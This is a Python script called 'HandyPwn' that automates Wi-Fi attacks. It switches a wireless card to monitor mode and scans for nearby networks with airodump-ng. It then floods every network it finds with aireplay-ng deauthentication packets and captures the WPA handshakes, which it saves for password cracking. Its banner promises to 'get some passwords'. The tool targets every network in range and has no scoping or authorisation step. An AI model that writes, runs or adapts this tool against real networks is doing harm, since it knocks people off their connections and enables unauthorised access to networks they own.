import os
import time
import re
import signal
import sys


def welcome_screen():
    ascii_art = r"""
 ___  ___  ________  ________   ________      ___    ___ ________  ___       __   ________      
|\  \|\  \|\   __  \|\   ___  \|\   ___ \    |\  \  /  /|\   __  \|\  \     |\  \|\   ___  \    
\ \  \\\  \ \  \|\  \ \  \\ \  \ \  \_|\ \   \ \  \/  / | \  \|\  \ \  \    \ \  \ \  \\ \  \   
 \ \   __  \ \   __  \ \  \\ \  \ \  \ \\ \   \ \    / / \ \   ____\ \  \  __\ \  \ \  \\ \  \  
  \ \  \ \  \ \  \ \  \ \  \\ \  \ \  \_\\ \   \/  /  /   \ \  \___|\ \  \|\__\_\  \ \  \\ \  \ 
   \ \__\ \__\ \__\ \__\ \__\\ \__\ \_______\__/  / /      \ \__\    \ \____________\ \__\\ \__\
    \|__|\|__|\|__|\|__|\|__| \|__|\|_______|\___/ /        \|__|     \|____________|\|__| \|__|
                                            \|___|/                                             
    """

    print(ascii_art)
    print("\n[ Welcome to HandyPwn - A PWNGOTCHI in Linux ]")
    print("[+] Press ENTER to get some passwords(:")
    input()  # Wait for the user to press Enter


def enable_monitor_mode(interface="wlan0"):
    # Kill conflicting processes
    print("[!] Stopping NetworkManager and wpa_supplicant...")
    os.system("sudo systemctl stop NetworkManager")
    os.system("sudo systemctl stop wpa_supplicant")

    # Enable monitor mode
    os.system(
        f"sudo ip link set {interface} down && sudo iw dev {interface} set type monitor && sudo ip link set {interface} up")
    time.sleep(2)  # Give time for monitor mode to activate

    # Verify interface mode
    result = os.popen("iw dev").read()
    match = re.search(r"Interface (\S+)\n\s+type monitor", result)
    mon_interface = match.group(1) if match else interface  # Default to wlan0 if not found

    print(f"[+] Monitor mode enabled on {mon_interface}")
    return mon_interface  # Return correct interface name


def disable_monitor_mode(interface="wlan0"):
    print("\n[!] Restoring managed mode before exiting...")
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type managed")
    os.system(f"sudo ip link set {interface} up")

    # Restart NetworkManager and wpa_supplicant
    print("[+] Restarting NetworkManager and wpa_supplicant...")
    os.system("sudo systemctl start NetworkManager")
    os.system("sudo systemctl start wpa_supplicant")

    print("[+] Managed mode restored. Exiting safely.")
    sys.exit(0)


def handle_exit(signal_received, frame):
    """ Handles Ctrl+C (SIGINT) to restore managed mode before exiting. """
    disable_monitor_mode()


def scan_networks(interface):
    print("[+] Scanning for Wi-Fi networks (10s)...")
    os.system(f"sudo timeout 10s airodump-ng {interface} --output-format csv -w scan_results")
    print("[+] Scan complete! Processing results...")


def extract_targets(csv_file="scan_results-01.csv"):
    targets = []
    if os.path.exists(csv_file):
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                if "Station MAC" in line or "BSSID" in line:
                    continue
                fields = line.split(",")
                if len(fields) > 13:
                    bssid, channel = fields[0].strip(), fields[3].strip()
                    if bssid and channel.isdigit():
                        targets.append((bssid, channel))
    return targets


def deauth_attack(interface, bssid):
    print(f"[+] Sending deauth attack to {bssid} (10s)...")
    os.system(f"sudo timeout 10s aireplay-ng --deauth 100 -a {bssid} {interface}")
    print(f"[+] Deauth attack on {bssid} complete.")


def capture_handshake(interface, bssid, channel, output_dir="handshakes"):
    os.makedirs(output_dir, exist_ok=True)
    print(f"[+] Sniffing for handshake on {bssid} (10s)...")
    os.system(f"sudo iwconfig {interface} channel {channel}")
    os.system(f"sudo timeout 10s airodump-ng --bssid {bssid} -c {channel} --write {output_dir}/{bssid} {interface}")
    print(f"[+] Handshake capture attempt complete for {bssid}")


def main():
    welcome_screen()  # Show ASCII art and wait for Enter

    interface = "wlan0"
    mon_interface = enable_monitor_mode(interface)  # Enable monitor mode

    scan_networks(mon_interface)
    targets = extract_targets()

    if not targets:
        print("[-] No targets found. Exiting.")
        disable_monitor_mode(mon_interface)  # Restore managed mode before exiting

    print(f"[+] Found {len(targets)} networks. Starting automated handshake capture...")
    for bssid, channel in targets:
        deauth_attack(mon_interface, bssid)  # Deauth clients first
        capture_handshake(mon_interface, bssid, channel)  # Capture handshakes

    print("[+] All handshakes captured! Saved in 'handshakes' directory.")
    disable_monitor_mode(mon_interface)  # Restore managed mode after finishing


if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_exit)  # Catch Ctrl+C
    main()
